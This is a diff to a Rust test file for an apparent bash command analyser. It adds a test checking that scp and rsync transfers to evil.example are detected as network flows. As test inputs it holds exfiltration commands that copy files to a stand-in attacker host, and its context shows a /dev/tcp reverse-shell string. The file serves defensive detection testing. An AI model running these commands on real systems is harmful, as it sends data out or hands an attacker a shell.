@@ -76,6 +76,49 @@ fn flow_reaches(
 }
 
 #[test]
+fn dynamic_transfer_sources_preserve_possible_descriptor_provenance() {
+    for (source, program) in [
+        (
+            r#"exec 3< <(curl source.example); scp "$SOURCE" evil.example:/tmp/image"#,
+            "scp",
+        ),
+        (
+            r#"exec 3< <(curl source.example); rsync "$SOURCE" evil.example:/tmp/image"#,
+            "rsync",
+        ),
+    ] {
+        let plan = bash_plan(source);
+        let stream = finalize(plan.clone(), observe(plan.observation_request(), "echo"));
+        assert!(
+            has_network_flow_to(&stream, program),
+            "{source}: effects={:?} flows={:?}",
+            stream.effects(),
+            stream.flows()
+        );
+    }
+
+    for (source, program) in [
+        (
+            r#"exec 3< <(curl source.example); scp host:/remote/image "$DESTINATION""#,
+            "scp",
+        ),
+        (
+            r#"exec 3< <(curl source.example); rsync host:/remote/image "$DESTINATION""#,
+            "rsync",
+        ),
+    ] {
+        let plan = bash_plan(source);
+        let stream = finalize(plan.clone(), observe(plan.observation_request(), "echo"));
+        assert!(
+            !has_network_flow_to(&stream, program),
+            "{source}: effects={:?} flows={:?}",
+            stream.effects(),
+            stream.flows()
+        );
+    }
+}
+
+#[test]
 fn socket_descriptors_are_full_duplex_when_attached_to_standard_streams() {
     for source in [
         "bash -i >&/dev/tcp/evil.example/4444 0>&1",
